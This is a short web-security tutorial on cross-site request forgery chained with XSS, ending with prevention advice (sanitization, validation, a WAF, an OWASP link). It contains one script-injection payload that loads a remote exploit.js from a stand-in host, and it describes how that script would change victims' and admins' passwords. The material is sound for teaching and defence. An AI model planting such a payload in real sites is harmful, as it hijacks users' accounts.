# Cross-Site Request Forgery (CSRF)
`CSRF` attacks may utilize `XSS` vulnerabilities to perform certain queries, and `API` calls on a web application that the victim is currently authenticated to. This would allow the attacker to perform actions as the authenticated user. 
- It may also utilize other vulnerabilities to perform the same functions, like utilizing HTTP parameters for attacks.

A common `CSRF` attack to gain higher privileged access to a web application is to craft a `JavaScript` payload that automatically changes the victim's password to the value set by the attacker.

Once the victim views the payload on the vulnerable page (e.g., a malicious comment containing the `JavaScript` `CSRF` payload), the `JavaScript` code would execute automatically. It would use the victim's logged-in session to change their password. Once that is done, the attacker can log in to the victim's account and control it.

`CSRF` can also be leveraged to attack admins and gain access to their accounts. Admins usually have access to sensitive functions, which can sometimes be used to attack and gain control over the back-end server.

Following this example, instead of using `JavaScript` code that would return the session cookie, we would load a remote `.js` (`JavaScript`) file, as follows:
```html
"><script src=//www.example.com/exploit.js></script>
```

The `exploit.js` file would contain the malicious `JavaScript` code that changes the user's password. Developing the `exploit.js` in this case requires knowledge of this web application's password changing procedure and `APIs`. The attacker would need to create `JavaScript` code that would replicate the desired functionality and automatically carry it out
## Prevention
There should be measures on the back end to detect and filter user input, it is also always important to filter and sanitize user input on the front end before it reaches the back end.

Two main controls must be applied when accepting user input:

|Type|Description|
|---|---|
|`Sanitization`|Removing special characters and non-standard characters from user input before displaying it or storing it.|
|`Validation`|Ensuring that submitted user input matches the expected format (i.e., submitted email matched email format)|
Another solution would be to implement a [web application firewall (WAF)](https://en.wikipedia.org/wiki/Web_application_firewall), which can help prevent injection attempts automatically.

This [Cross-Site Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html) from OWASP discusses the attack and prevention measures in greater detail.